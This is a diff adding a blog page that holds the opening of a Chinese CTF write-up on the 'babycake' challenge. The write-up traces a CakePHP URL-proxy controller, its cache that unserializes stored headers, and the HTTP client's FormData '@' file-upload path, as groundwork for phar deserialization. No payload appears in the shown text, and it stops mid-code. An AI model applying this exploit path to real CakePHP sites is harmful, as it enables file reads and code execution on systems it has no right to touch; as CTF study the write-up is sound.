@@ -1,0 +1,747 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="php,ctf,代码审计,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="phar造成的反序列化的应用">
+<meta name="keywords" content="php,ctf,代码审计">
+<meta property="og:type" content="article">
+<meta property="og:title" content="babycake分析">
+<meta property="og:url" content="https://hxtch.github.io/2018/11/30/2018-11-30-babycake分析/index.html">
+<meta property="og:site_name" content="palm">
+<meta property="og:description" content="phar造成的反序列化的应用">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="https://i.loli.net/2018/11/30/5c00fa794f8e3.png">
+<meta property="og:updated_time" content="2018-11-30T15:59:21.244Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="babycake分析">
+<meta name="twitter:description" content="phar造成的反序列化的应用">
+<meta name="twitter:image" content="https://i.loli.net/2018/11/30/5c00fa794f8e3.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://hxtch.github.io/2018/11/30/2018-11-30-babycake分析/">
+
+
+
+
+
+  <title>babycake分析 | palm</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">palm</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://hxtch.github.io/2018/11/30/2018-11-30-babycake分析/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="palm">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="palm">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">babycake分析</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-11-30T00:00:00+08:00">
+                2018-11-30
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/blog/" itemprop="url" rel="index">
+                    <span itemprop="name">blog</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+              <div class="post-description">
+                  phar造成的反序列化的应用
+              </div>
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="1-追踪"><a href="#1-追踪" class="headerlink" title="1 追踪"></a>1 追踪</h2><p>首先我们来看代码的主要逻辑部分 PagesCOntroller.php的部分代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PagesController</span> <span class="keyword">extends</span> <span class="title">AppController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">httpclient</span><span class="params">($method, $url, $headers, $data)</span> </span>&#123;</span><br><span class="line">        $options = [</span><br><span class="line">            <span class="string">'headers'</span> =&gt; $headers, </span><br><span class="line">            <span class="string">'timeout'</span> =&gt; <span class="number">10</span></span><br><span class="line">        ]; </span><br><span class="line"></span><br><span class="line">        $http = <span class="keyword">new</span> Client();</span><br><span class="line">        <span class="keyword">return</span> $http-&gt;$method($url, $data, $options);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">back</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;render(<span class="string">'pages'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">_cache_dir</span><span class="params">($key)</span></span>&#123;</span><br><span class="line">        $ip = <span class="keyword">$this</span>-&gt;request-&gt;getEnv(<span class="string">'REMOTE_ADDR'</span>);</span><br><span class="line">        $index = sprintf(<span class="string">'mycache/%s/%s/'</span>, $ip, $key);</span><br><span class="line">        <span class="keyword">return</span> CACHE . $index;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">cache_set</span><span class="params">($key, $response)</span> </span>&#123;</span><br><span class="line">        $cache_dir = <span class="keyword">$this</span>-&gt;_cache_dir($key);</span><br><span class="line">        <span class="keyword">if</span> ( !file_exists($cache_dir) ) &#123;</span><br><span class="line">            mkdir($cache_dir, <span class="number">0700</span>, <span class="keyword">true</span>);</span><br><span class="line">            file_put_contents($cache_dir . <span class="string">"body.cache"</span>, $response-&gt;body);</span><br><span class="line">            file_put_contents($cache_dir . <span class="string">"headers.cache"</span>, serialize($response-&gt;headers));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">cache_get</span><span class="params">($key)</span> </span>&#123;</span><br><span class="line">        $cache_dir = <span class="keyword">$this</span>-&gt;_cache_dir($key);</span><br><span class="line">        <span class="keyword">if</span> (file_exists($cache_dir)) &#123;</span><br><span class="line">            $body   = file_get_contents($cache_dir . <span class="string">"/body.cache"</span>);</span><br><span class="line">            $headers = file_get_contents($cache_dir . <span class="string">"/headers.cache"</span>);</span><br><span class="line">            </span><br><span class="line">            $body = <span class="string">"&lt;!-- from cache --&gt;\n"</span> . $body;</span><br><span class="line">            $headers = unserialize($headers);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> DymmyResponse($headers, $body);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">display</span><span class="params">(...$path)</span> </span>&#123;    </span><br><span class="line">        $request  = <span class="keyword">$this</span>-&gt;request;</span><br><span class="line">        $data = $request-&gt;getQuery(<span class="string">'data'</span>);</span><br><span class="line">        $url  = $request-&gt;getQuery(<span class="string">'url'</span>);</span><br><span class="line">        <span class="keyword">if</span> (strlen($url) == <span class="number">0</span>) </span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;back();</span><br><span class="line"></span><br><span class="line">        $scheme = strtolower( parse_url($url, PHP_URL_SCHEME) );</span><br><span class="line">        <span class="keyword">if</span> (strlen($scheme) == <span class="number">0</span> || !in_array($scheme, [<span class="string">'http'</span>, <span class="string">'https'</span>]))</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;back();</span><br><span class="line"></span><br><span class="line">        $method = strtolower( $request-&gt;getMethod() );</span><br><span class="line">        <span class="keyword">if</span> ( !in_array($method, [<span class="string">'get'</span>, <span class="string">'post'</span>, <span class="string">'put'</span>, <span class="string">'delete'</span>, <span class="string">'patch'</span>]) )</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;back();</span><br><span class="line"></span><br><span class="line">\</span><br><span class="line">        $headers = [];</span><br><span class="line">        <span class="keyword">foreach</span> ($request-&gt;getHeaders() <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">            <span class="keyword">if</span> (in_array( strtolower($key), [<span class="string">'host'</span>, <span class="string">'connection'</span>, <span class="string">'expect'</span>, <span class="string">'content-length'</span>] ))</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">if</span> (count($value) == <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            $headers[$key] = $value[<span class="number">0</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $key = md5($url);</span><br><span class="line">        <span class="keyword">if</span> ($method == <span class="string">'get'</span>) &#123;</span><br><span class="line">            $response = <span class="keyword">$this</span>-&gt;cache_get($key);</span><br><span class="line">            <span class="keyword">if</span> (!$response) &#123;</span><br><span class="line">                $response = <span class="keyword">$this</span>-&gt;httpclient($method, $url, $headers, <span class="keyword">null</span>);</span><br><span class="line">                <span class="keyword">$this</span>-&gt;cache_set($key, $response);                </span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $response = <span class="keyword">$this</span>-&gt;httpclient($method, $url, $headers, $data);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> ($response-&gt;headers <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">            <span class="keyword">if</span> (strtolower($key) == <span class="string">'content-type'</span>) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;response-&gt;type(<span class="keyword">array</span>(<span class="string">'type'</span> =&gt; $value));</span><br><span class="line">                <span class="keyword">$this</span>-&gt;response-&gt;type(<span class="string">'type'</span>);</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;response-&gt;withHeader($key, $value);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;response-&gt;body($response-&gt;body);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;response;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>当我们使用get方法访问时，会检查缓存，如果有缓存的话，将响应作为body返回，如果没有缓存的话，设置缓存，存入tmp/mycache/ip/md5(url)/body.cache 和headers.cache。</p>
+<p>查看client.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">($url, $data = [], array $options = [])</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $options = <span class="keyword">$this</span>-&gt;_mergeOptions($options);</span><br><span class="line">        $body = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>($data[<span class="string">'_content'</span>])) &#123;</span><br><span class="line">            $body = $data[<span class="string">'_content'</span>];</span><br><span class="line">            <span class="keyword">unset</span>($data[<span class="string">'_content'</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        $url = <span class="keyword">$this</span>-&gt;buildUrl($url, $data, $options);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;_doRequest(</span><br><span class="line">            Request::METHOD_GET,</span><br><span class="line">            $url,</span><br><span class="line">            $body,</span><br><span class="line">            $options</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Do a POST request.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string $url The url or path you want to request.</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> mixed $data The post data you want to send.</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> array $options Additional options for the request.</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> \Cake\Http\Client\Response</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">post</span><span class="params">($url, $data = [], array $options = [])</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $options = <span class="keyword">$this</span>-&gt;_mergeOptions($options);</span><br><span class="line">        $url = <span class="keyword">$this</span>-&gt;buildUrl($url, [], $options);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;_doRequest(Request::METHOD_POST, $url, $data, $options);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">_doRequest</span><span class="params">($method, $url, $data, $options)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $request = <span class="keyword">$this</span>-&gt;_createRequest(</span><br><span class="line">            $method,</span><br><span class="line">            $url,</span><br><span class="line">            $data,</span><br><span class="line">            $options</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;send($request, $options);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line">  </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Creates a new request object based on the parameters.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string $method HTTP method name.</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string $url The url including query string.</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> mixed $data The request body.</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> array $options The options to use. Contains auth, proxy, etc.</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> \Cake\Http\Client\Request</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">_createRequest</span><span class="params">($method, $url, $data, $options)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        ...</span><br><span class="line">        <span class="keyword">if</span> (is_string($data) &amp;&amp; !<span class="keyword">isset</span>($headers[<span class="string">'Content-Type'</span>]) &amp;&amp; !<span class="keyword">isset</span>($headers[<span class="string">'content-type'</span>])) &#123;</span><br><span class="line">            $headers[<span class="string">'Content-Type'</span>] = <span class="string">'application/x-www-form-urlencoded'</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $request = <span class="keyword">new</span> Request($url, $method, $headers, $data);</span><br><span class="line">        ...</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $request;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>
+<p>查看request类<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Request</span> <span class="keyword">extends</span> <span class="title">Message</span> <span class="keyword">implements</span> <span class="title">RequestInterface</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">RequestTrait</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Constructor</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * Provides backwards compatible defaults for some properties.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string $url The request URL</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string $method The HTTP method to use.</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> array $headers The HTTP headers to set.</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> array|string|null $data The request body to use.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($url = <span class="string">''</span>, $method = self::METHOD_GET, array $headers = [], $data = null)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;validateMethod($method);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;method = $method;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;uri = <span class="keyword">$this</span>-&gt;createUri($url);</span><br><span class="line">        $headers += [</span><br><span class="line">            <span class="string">'Connection'</span> =&gt; <span class="string">'close'</span>,</span><br><span class="line">            <span class="string">'User-Agent'</span> =&gt; <span class="string">'CakePHP'</span></span><br><span class="line">        ];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;addHeaders($headers);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;body($data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">body</span><span class="params">($body = null)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ($body === <span class="keyword">null</span>) &#123;</span><br><span class="line">            $body = <span class="keyword">$this</span>-&gt;getBody();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> $body ? $body-&gt;__toString() : <span class="string">''</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (is_array($body)) &#123;</span><br><span class="line">            $formData = <span class="keyword">new</span> FormData();</span><br><span class="line">            $formData-&gt;addMany($body);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;header(<span class="string">'Content-Type'</span>, $formData-&gt;contentType());</span><br><span class="line">            $body = (string)$formData;</span><br><span class="line">        &#125;</span><br><span class="line">        $stream = <span class="keyword">new</span> Stream(<span class="string">'php://memory'</span>, <span class="string">'rw'</span>);</span><br><span class="line">        $stream-&gt;write($body);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;stream = $stream;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>data会传给body函数，如果data是一个数组的话，交给FormData类来处理<br>查看FormData类<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">add</span><span class="params">($name, $value = null)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (is_array($value)) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;addRecursive($name, $value);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (is_resource($value)) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;addFile($name, $value);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (is_string($value) &amp;&amp; strlen($value) &amp;&amp; $value[<span class="number">0</span>] === <span class="string">'@'</span>) &#123;</span><br><span class="line">            trigger_error(</span><br><span class="line">                <span class="string">'Using the @ syntax for file uploads is not safe and is deprecated. '</span> .</span><br><span class="line">                <span class="string">'Instead you should use file handles.'</span>,</span><br><span class="line">                E_USER_DEPRECATED</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">$this</span>-&gt;addFile($name, $value);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> ($name <span class="keyword">instanceof</span> FormDataPart &amp;&amp; $value === <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;_hasComplexPart = <span class="keyword">true</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;_parts[] = $name;</span><br><span class="line">        